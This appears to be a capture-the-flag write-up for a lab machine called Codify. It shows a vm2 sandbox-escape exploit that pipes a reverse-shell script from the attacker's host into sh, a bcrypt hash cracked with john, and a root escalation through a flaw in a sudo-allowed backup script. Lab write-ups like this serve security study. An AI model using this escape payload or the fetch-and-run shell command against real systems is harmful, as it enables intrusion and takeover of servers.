# CODIFY

On the web server we can find a code editor in /about we can see that this code editor is using wm2 library 
after a quick google search we see that we can bypass it with this 
```
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
```
we have code execution here

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl -L http://10.10.16.4:8889/reverse.sh | sh');
}
`

console.log(vm.run(code));
``` 

in /var/ww/contact we found a tickets.db
download it and run it against sqlite3 we found 
```
INSERT INTO users VALUES(3,'joshua','$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2');
```

run it by john 
```
john hash --wordlist=~/Downloads/rockyou.txt
```

we found password spongebob1
we can now ssh to joshua

```
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

so we can play with /opt/scripts/mysql-backup.sh
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"

we we make (steal ok :D) a script to automate this by bruteforce and we have the root password 
